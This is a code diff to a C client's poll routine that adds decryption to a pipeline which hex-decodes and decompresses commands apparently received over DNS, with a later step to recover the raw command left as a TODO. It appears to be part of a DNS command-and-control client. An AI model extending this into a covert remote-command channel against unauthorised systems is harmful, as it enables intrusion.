@@ -6,6 +6,7 @@
 #include "utils.h"
 #include "options.h"
 #include "compression.h"
+#include "crypt.h"
 
 /* DNS STUFF */
 #include <sys/types.h>
@@ -136,6 +137,7 @@ void poll(client_t *client)
 
         // str hex decode to byte array
         char gz_bytes[strlen(command) / 2];
+
 #ifdef DEBUG
         int w = hex_str_to_char(command, gz_bytes);
         hex_dump("gz_bytes", &gz_bytes, sizeof(gz_bytes));
@@ -150,17 +152,21 @@ void poll(client_t *client)
 
         // decompress
         char inflated[255];
-        u_int olen = 0;
-        int zres = zdepress(gz_bytes, sizeof(gz_bytes), &olen, inflated);
+        u_int inflated_len = 0;
+        int zres = zdepress(gz_bytes, sizeof(gz_bytes), &inflated_len, inflated);
         if (zres != 0)
         {
             Dprintf("decompression failed with status: %d\n", zres);
             return;
         }
+        hex_dump("inflated", &inflated, inflated_len);
 
-        hex_dump("inflated", &inflated, olen);
+        // decrypt
+        char clear[inflated_len];
+        size_t clear_len = decrypt(inflated, inflated_len, clear);
+        hex_dump("clear", clear, clear_len);
 
-        // TODO: decrypt, json decode to get raw command
+        // TODO: json decode to get raw command
         return;
     }
 }
